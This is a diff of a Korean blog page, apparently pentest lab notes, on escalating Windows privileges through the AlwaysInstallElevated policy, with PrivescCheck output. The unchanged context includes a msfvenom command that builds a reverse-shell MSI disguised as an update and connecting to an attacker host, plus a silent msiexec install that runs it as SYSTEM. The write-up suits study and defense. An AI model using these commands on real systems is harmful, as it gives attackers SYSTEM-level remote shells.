@@ -1,3 +1,14 @@
+---
+layout: page
+title: AlwaysInstallElevated_(feat._PrivescCheck.ps1)
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
+
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 
 ### 1. **취약점 기본 개념 (AlwaysInstallElevated 정책)**
@@ -24,7 +35,7 @@
 [[PrivescCheck]]
 
 
-```powershell title="PrivescCheck"
+```powershell
 ┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
 ┃ NAME     ┃ Configuration - MSI AlwaysInstallElevated         ┃
@@ -63,7 +74,7 @@ AltDefaultPassword   :
 
 리버스 TCP 쉘을 MSI 패키지로 만듭니다. 설치 시 쉘이 실행되어 공격자(Kali)로 연결합니다.
 
-```bash title="Kali"
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.10 LPORT=443 -a x64 --platform Windows -f msi -o kb1108264.msi
 ```
 
@@ -72,7 +83,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.10 LPORT=443 -a x64 --pl
 - msiexec /i: MSI 설치, /qn: 무음 설치.
 - 결과: MSI 내 쉘이 SYSTEM으로 실행되어 Administrator(또는 SYSTEM) 권한 리버스 쉘이 Kali에 연결됩니다
 
-```powershell title="Target"
+```powershell
 runas /user:dev-datasci-lowpriv “msiexec /i C:\Users\dev-datasci-lowpriv\Downloads\kb1108264.msi /qn”
 ```
 
